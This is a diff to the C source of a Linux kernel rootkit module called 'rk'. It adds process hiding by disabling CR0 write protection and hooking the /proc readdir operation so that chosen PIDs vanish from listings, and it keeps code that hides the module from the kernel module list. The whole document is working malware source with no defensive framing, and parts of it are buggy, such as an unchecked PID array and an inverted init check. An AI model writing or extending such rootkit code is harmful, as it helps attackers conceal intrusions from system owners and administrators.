@@ -10,22 +10,32 @@
 #include <linux/cdev.h>
 #include <linux/cred.h>
 #include <linux/version.h>
+#include <linux/proc_fs.h>
 
 #define DEVICE_NAME "rk"
 #define CLASS_NAME "rk"
 
+#define MAX_NUM_PIDS 1024
+
 // Commands
-#define HIDE_MOD_CMD "hidemod"
-#define SHOW_MOD_CMD "showmod"
+#define HIDE_MOD_CMD "modhide"
+#define SHOW_MOD_CMD "modshow"
+#define HIDE_PID_CMD "phide"
+#define SHOW_PID_CMD "pshow"
 
 static int major_number;
 static struct class *char_class;
 static struct device *char_device;
 
+static unsigned int pids[MAX_NUM_PIDS];
+static unsigned int pid_count = 0;
+
 static int module_hidden = 0;
 
+static struct proc_dir_entry *proc_root;
 static struct list_head *prev_mod;
 static struct list_head *prev_kobj;
+
 
 // Char driver prototypes
 static int     device_open(struct inode *, struct file *);
@@ -36,8 +46,15 @@ static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 // Other prototypes
 void hide_module(void);
 void show_module(void);
+void hide_proc(const char *);
+void show_proc(const char *);
 
-static struct file_operations fops =
+int (*orig_readdir) (struct file *, void *, filldir_t);
+
+static struct file_operations *proc_fops;
+filldir_t orig_filldir;
+
+static struct file_operations dev_fops =
 {
    .owner = THIS_MODULE,
    .open = device_open,
@@ -71,12 +88,20 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
         
         if (strncmp(tok, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD)) == 0) {
             hide_module();
-            printk(KERN_INFO "rk: Module hidden.");
         }
         else if (strncmp(tok, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD)) == 0) {
             show_module();
-            printk(KERN_INFO "rk: Module revealed.");
-        }           
+        }
+        else if(strncmp(tok, HIDE_PID_CMD, strlen(HIDE_PID_CMD)) == 0) {
+            tok = end;
+            strsep(&end, " ");
+            hide_proc(tok);
+        }
+        else if(strncmp(tok, SHOW_PID_CMD, strlen(SHOW_PID_CMD)) == 0) {
+            tok = end;
+            strsep(&end, " ");
+            show_proc(tok);
+        }      
     }
     kfree(cmds);
     return len;
@@ -85,6 +110,34 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
 static int device_release(struct inode *inodep, struct file *filep)
 {
     return 0;
+}
+
+// Returns index of item if it is in the array
+int in_array(int val, int *arr, int size)
+{
+    int i;
+    for (i = 0; i < size; i++) {
+        if (arr[i] == val) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int rk_filldir(void *buffer, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
+{
+    long name_as_int;
+    strict_strtol(name, 10, &name_as_int);
+    if (in_array(name_as_int, pids, pid_count))
+        return 0;
+        
+    return orig_filldir(buffer, name, namlen, offset, ino, d_type);
+}
+
+static int proc_readdir(struct file *filep, void *buffer, filldir_t fdir)
+{
+    orig_filldir = fdir;
+    return orig_readdir(filep, buffer, rk_filldir);
 }
 
 /*
@@ -114,6 +167,8 @@ void hide_module(void)
     THIS_MODULE->notes_attrs = NULL;
     
     module_hidden = !module_hidden;
+    printk(KERN_INFO "rk: Module hidden.");
+
 }
 
 void show_module(void)
@@ -123,12 +178,28 @@ void show_module(void)
         
     list_add(&THIS_MODULE->list, prev_mod);
     module_hidden = !module_hidden;
+    printk(KERN_INFO "rk: Module revealed.");
 }
 
-static int __init init_mod(void)
-{    
+void hide_proc(const char *pid)
+{
+    long pid_as_int;
+    strict_strtol(pid, 10, &pid_as_int);
+    pids[pid_count] = pid_as_int;
+    pid_count++;
+    printk(KERN_INFO "rk: Hiding pid %s.\n", pid);
+}
+
+void show_proc(const char *pid)
+{
+    // TODO: implement
+    printk(KERN_INFO "rk: Revealing pid %s.\n", pid);    
+}
+
+int device_init(void)
+{
     // Dynamically allocate major device number
-    if ((major_number = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
+    if ((major_number = register_chrdev(0, DEVICE_NAME, &dev_fops)) < 0) {
         printk(KERN_ERR "rk: Failed to register a major number.\n");
         return major_number;
     }
@@ -155,6 +226,33 @@ static int __init init_mod(void)
     printk(KERN_INFO "rk: Device driver registered.\n");
         
     printk(KERN_INFO "rk: Module initialized.\n");
+    return 0;
+}
+
+// Initializes pointer to proc_root and hijacks proc readdir syscall
+void proc_init(void)
+{
+    struct proc_dir_entry *new_proc;
+    static struct file_operations fileops_struct = {0};
+    new_proc = proc_create("tmp", 0644, NULL, &fileops_struct);
+    proc_root = new_proc->parent;
+    remove_proc_entry("tmp", 0);
+    
+    proc_fops = (struct file_operations*) proc_root->proc_fops;
+    orig_readdir = proc_fops->readdir;
+    
+    write_cr0(read_cr0() & (~0x10000));
+    proc_fops->readdir = proc_readdir;
+    write_cr0(read_cr0() | 0x10000);
+}
+
+static int __init init_mod(void)
+{    
+    int dev_init_ret = 0;
+    if ((dev_init_ret = device_init()) > 0) {
+        return dev_init_ret;
+    }
+    proc_init();
     // hide_module();
 	return 0;
 }
